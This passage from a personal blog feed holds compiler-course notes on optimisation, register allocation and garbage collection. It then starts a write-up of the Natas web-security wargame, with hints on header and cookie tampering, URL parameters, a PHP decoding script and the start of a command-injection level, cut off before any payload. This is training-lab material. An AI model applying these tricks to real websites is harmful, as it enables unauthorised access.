src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145750438.png" class="" title="image-20200808145750438"><blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808145944381.png" class="" title="image-20200808145944381"><p>we modify the store at that point with the new value so we replace the location l id or we update the value of l, i, d to be the value of v and we do that in store s1 which gives us a new store s2.</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808150452154.png" class="" title="image-20200808150452154"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808150819402.png" class="" title="image-20200808150819402"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808151558053.png" class="" title="image-20200808151558053"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808151807567.png" class="" title="image-20200808151807567"><h4 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808151959085.png" class="" title="image-20200808151959085"><h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152117753.png" class="" title="image-20200808152117753"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152158870.png" class="" title="image-20200808152158870"><h4 id="let"><a href="#let" class="headerlink" title="let"></a>let</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152603765.png" class="" title="image-20200808152603765"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808152652618.png" class="" title="image-20200808152652618"><h3 id="Cool-Semantics-II"><a href="#Cool-Semantics-II" class="headerlink" title="Cool Semantics II"></a>Cool Semantics II</h3><h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808153226162.png" class="" title="image-20200808153226162"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808153301600.png" class="" title="image-20200808153301600"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808153553893.png" class="" title="image-20200808153553893"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154013836.png" class="" title="image-20200808154013836"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154217191.png" class="" title="image-20200808154217191"><h4 id="dynamic-dispatch"><a href="#dynamic-dispatch" class="headerlink" title="dynamic dispatch"></a>dynamic dispatch</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154401563.png" class="" title="image-20200808154401563"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154927736.png" class="" title="image-20200808154927736"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808155513811.png" class="" title="image-20200808155513811"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808155706318.png" class="" title="image-20200808155706318"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808155830158.png" class="" title="image-20200808155830158"><h3 id="PA5"><a href="#PA5" class="headerlink" title="PA5"></a>PA5</h3><h2 id="优化-Optimization"><a href="#优化-Optimization" class="headerlink" title="优化 Optimization"></a>优化 Optimization</h2><h3 id="Intermediate-Code"><a href="#Intermediate-Code" class="headerlink" title="Intermediate Code"></a>Intermediate Code</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724164441833.png" class="" title="image-20200724164441833"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724164545484.png" class="" title="image-20200724164545484"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724164657828.png" class="" title="image-20200724164657828"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724165004707.png" class="" title="image-20200724165004707"><h3 id="Optimization-Overview"><a href="#Optimization-Overview" class="headerlink" title="Optimization Overview"></a>Optimization Overview</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727113032723.png" class="" title="image-20200727113032723"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727113227764.png" class="" title="image-20200727113227764"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727114137055.png" class="" title="image-20200727114137055"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727114346148.png" class="" title="image-20200727114346148"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727135941770.png" class="" title="image-20200727135941770"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727140110611.png" class="" title="image-20200727140110611"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727141024199.png" class="" title="image-20200727141024199"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727142541805.png" class="" title="image-20200727142541805"><h3 id="Local-Optimization"><a href="#Local-Optimization" class="headerlink" title="Local Optimization"></a>Local Optimization</h3><p>有些可以删除的</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">x</span> = x + <span class="hljs-number">0</span><br><span class="hljs-attr">x</span> = x * <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>有些可以简化的</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> * <span class="hljs-number">0</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span><br>y <span class="hljs-operator">=</span> y ** <span class="hljs-number">2</span> <span class="hljs-operator">=</span>&gt; y <span class="hljs-operator">=</span> y * y<br><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> *<span class="hljs-number">8</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> &lt;&lt; <span class="hljs-number">3</span><br><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> * <span class="hljs-number">15</span> <span class="hljs-operator">=</span>&gt; t <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> &lt;&lt; <span class="hljs-number">4</span><span class="hljs-comment">;x = t - x;</span><br></code></pre></td></tr></table></figure><p>（一些机子上&lt;&lt;比*号快</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727143956671.png" class="" title="image-20200727143956671"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727144813527.png" class="" title="image-20200727144813527"><p>保留最高精度的浮点数，让架构决定计算结果</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727145423870.png" class="" title="image-20200727145423870"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727145657145.png" class="" title="image-20200727145657145"><h3 id="Peephole-Optimization"><a href="#Peephole-Optimization" class="headerlink" title="Peephole Optimization"></a>Peephole Optimization</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727150656620.png" class="" title="image-20200727150656620"><h3 id="Dataflow-Analysis"><a href="#Dataflow-Analysis" class="headerlink" title="Dataflow Analysis"></a>Dataflow Analysis</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727152656236.png" class="" title="image-20200727152656236"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727152915293.png" class="" title="image-20200727152915293"><h3 id="Constant-Propagation"><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h3> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727153509070.png" class="" title="image-20200727153509070"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727154004049.png" class="" title="image-20200727154004049"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727154640486.png" class="" title="image-20200727154640486"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727155002293.png" class="" title="image-20200727155002293"><h3 id="Analysis-of-Loops"><a href="#Analysis-of-Loops" class="headerlink" title="Analysis of Loops"></a>Analysis of Loops</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727161011290.png" class="" title="image-20200727161011290"><h3 id="Orderings"><a href="#Orderings" class="headerlink" title="Orderings"></a>Orderings</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727162943132.png" class="" title="image-20200727162943132"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727163013545.png" class="" title="image-20200727163013545"><h3 id="Liveness-Analysis"><a href="#Liveness-Analysis" class="headerlink" title="Liveness Analysis"></a>Liveness Analysis</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727164706188.png" class="" title="image-20200727164706188"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727164954867.png" class="" title="image-20200727164954867"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165049700.png" class="" title="image-20200727165049700"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165134688.png" class="" title="image-20200727165134688"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165215533.png" class="" title="image-20200727165215533"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165457537.png" class="" title="image-20200727165457537"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165949003.png" class="" title="image-20200727165949003"> <h3 id="Register-Allocation"><a href="#Register-Allocation" class="headerlink" title="Register Allocation"></a>Register Allocation</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730092739618.png" class="" title="image-20200730092739618"><h4 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730093244462.png" class="" title="image-20200730093244462"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730093639654.png" class="" title="image-20200730093639654"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730093758586.png" class="" title="image-20200730093758586"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730094201480.png" class="" title="image-20200730094201480"><h3 id="Graph-Coloring"><a href="#Graph-Coloring" class="headerlink" title="Graph Coloring"></a>Graph Coloring</h3><p>A <strong>coloring of a graph</strong> is an assignment of colors to nodes, sch that nodes connected by an edge have different colors.</p><p>A graph is <strong>k-colorable</strong> if it has a coloring with k colors.In here, colors = registers. Let k = number of machine registers.</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730100849423.png" class="" title="image-20200730100849423"><p>再用寄存器名字替换</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730101320589.png" class="" title="image-20200730101320589"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730104742443.png" class="" title="image-20200730104742443"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105029797.png" class="" title="image-20200730105029797"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105203033.png" class="" title="image-20200730105203033"><h4 id="example-3"><a href="#example-3" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105810302.png" class="" title="image-20200730105810302"><p>Remove d Stack:{d,a}</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105936761.png" class="" title="image-20200730105936761"><p> now it doesn’t matter which node we pick because we can process them in any</p><p>Remove c,b,e,f </p><p><strong>now Empty-graph - done with the first part</strong></p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730110258876.png" class="" title="image-20200730110258876"><p>going to pick the <strong>lowest numbered register</strong> that is not used by any of its neighbors. </p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730110339115.png" class="" title="image-20200730110339115"><p>b is the only register that isnt used</p><h3 id="Spilling"><a href="#Spilling" class="headerlink" title="Spilling"></a>Spilling</h3><p>if tgere’s no node that we can delete from the graph, in this situation, we’re going to pick and know that<br>there is a candidate for spilling.</p><ul><li>A spilled value “lives” in memory</li></ul><blockquote><p>optimisitic coloring =&gt; hope that among the 4 neighbors of f we use less than 3 colors</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730112509274.png" class="" title="image-20200730112509274"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730112551179.png" class="" title="image-20200730112551179"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730113112519.png" class="" title="image-20200730113112519"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730112936005.png" class="" title="image-20200730112936005"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730113228217.png" class="" title="image-20200730113228217"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730113618452.png" class="" title="image-20200730113618452"><h3 id="Managing-Caches"><a href="#Managing-Caches" class="headerlink" title="Managing Caches"></a>Managing Caches</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730114154225.png" class="" title="image-20200730114154225"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730114748858.png" class="" title="image-20200730114748858"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730114725025.png" class="" title="image-20200730114725025"><h2 id="Garbage-collection"><a href="#Garbage-collection" class="headerlink" title="Garbage collection"></a>Garbage collection</h2><h3 id="Automatic-Memory-Management"><a href="#Automatic-Memory-Management" class="headerlink" title="Automatic Memory Management"></a>Automatic Memory Management</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730144340907.png" class="" title="image-20200730144340907"><h4 id="How-to-know-an-object-will-“never-be-used-again”"><a href="#How-to-know-an-object-will-“never-be-used-again”" class="headerlink" title="How to know an object will “never be used again”?"></a>How to know an object will “never be used again”?</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730145148008.png" class="" title="image-20200730145148008"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730145452186.png" class="" title="image-20200730145452186"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150153526.png" class="" title="image-20200730150153526"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150244426.png" class="" title="image-20200730150244426"><h3 id="Mark-and-Sweep"><a href="#Mark-and-Sweep" class="headerlink" title="Mark and Sweep"></a>Mark and Sweep</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150356190.png" class="" title="image-20200730150356190"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150542396.png" class="" title="image-20200730150542396"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730162740553.png" class="" title="image-20200730162740553"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730163335635.png" class="" title="image-20200730163335635"><h3 id="Stop-and-Copy"><a href="#Stop-and-Copy" class="headerlink" title="Stop and Copy"></a>Stop and Copy</h3><p>当旧区域满的时候，将有用的复制到新区域，然后新旧区域名字对换。</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730171624649.png" class="" title="image-20200730171624649"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730171725223.png" class="" title="image-20200730171725223"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730172133916.png" class="" title="image-20200730172133916"><p>被复制过去之后，指针访问旧区域的时候，会发现旧区域已被标记，然后会更新指针指向新区域</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730172842124.png" class="" title="image-20200730172842124"><p>scan到alloc之间就是需要被更新的</p><h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>先复制A，然后根据指向按序复制到新区域并更新pointer</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730173025615.png" class="" title="image-20200730173025615"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730173211485.png" class="" title="image-20200730173211485"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730174134335.png" class="" title="image-20200730174134335"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730174236562.png" class="" title="image-20200730174236562"><h3 id="Conservative-Collection"><a href="#Conservative-Collection" class="headerlink" title="Conservative Collection"></a>Conservative Collection</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730175043466.png" class="" title="image-20200730175043466"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730175410736.png" class="" title="image-20200730175410736"><h3 id="Reference-Counting"><a href="#Reference-Counting" class="headerlink" title="Reference Counting"></a>Reference Counting</h3><p>Try to collect an object when there are no more pointers to it.</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730180530542.png" class="" title="image-20200730180530542"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730181146802.png" class="" title="image-20200730181146802"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730181841627.png" class="" title="image-20200730181841627"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730182213114.png" class="" title="image-20200730182213114">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Natas</title>
    <link href="/2020/05/23/Natas/"/>
    <url>/2020/05/23/Natas/</url>
    
    <content type="html"><![CDATA[<h2 id="natas0"><a href="#natas0" class="headerlink" title="natas0"></a>natas0</h2><h2 id="natas1"><a href="#natas1" class="headerlink" title="natas1"></a>natas1</h2><p>禁用了右键，但还是可以F12或者</p><h2 id="natas2"><a href="#natas2" class="headerlink" title="natas2"></a>natas2</h2><p>打开过<code>files/pixel.png</code>，但没想到这是目录权限问题。。。。顺便搜了一下爆破文件目录的工具，kali自带的dirbuster <a href="https://www.cnblogs.com/xz25/p/12829315.html">link</a></p><h2 id="natas3"><a href="#natas3" class="headerlink" title="natas3"></a>natas3</h2><p>谷歌找不到–九-曲-十-八-弯—&gt;robots.txt</p><p>awsl</p><h2 id="natas4"><a href="#natas4" class="headerlink" title="natas4"></a>natas4</h2><p>点击refresh之后Referer会显示，改成对应的natas5即可</p><h2 id="natas5"><a href="#natas5" class="headerlink" title="natas5"></a>natas5</h2><p>Login, 那就看cookie</p><p>改成1就行</p><h2 id="natas6"><a href="#natas6" class="headerlink" title="natas6"></a>natas6</h2><p>打开再按f12就可以看见了</p><h2 id="natas7"><a href="#natas7" class="headerlink" title="natas7"></a>natas7</h2><p>看到hint之后，就尝试在url中尝试page=ls</p><p>等号后输入hint的就行</p><h2 id="natas8"><a href="#natas8" class="headerlink" title="natas8"></a>natas8</h2><p>给的很清楚，输入的数值，先base64_encode，再strrev，再bin2hex，如果和encodedSecret一样就get了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-variable">$encodedSecret</span> = <span class="hljs-string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;<br><span class="hljs-variable">$result</span> = base64_decode(strrev(hex2bin(<span class="hljs-variable">$encodedSecret</span>)));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>mac 自带了php环境hhh真好</p></blockquote><h2 id="natas9"><a href="#natas9" class="headerlink" title="natas9"></a>natas9</h2><p>命令注入</p><blockquote><p>passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : void</p><p>同 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 函数类似， <strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 